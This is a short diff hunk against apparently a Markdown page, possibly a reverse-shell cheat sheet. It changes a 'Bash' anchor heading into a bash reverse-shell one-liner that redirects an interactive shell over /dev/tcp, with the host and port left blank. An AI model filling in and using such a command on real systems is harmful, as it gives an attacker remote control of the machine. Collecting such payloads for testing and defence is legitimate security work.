@@ -63,4 +63,4 @@ ____
 
 ____
 
-<a name="Bash"></a>Bash
+<a name="Bash"></a>bash -c 'exec bash -i &>/dev/tcp// <&1'
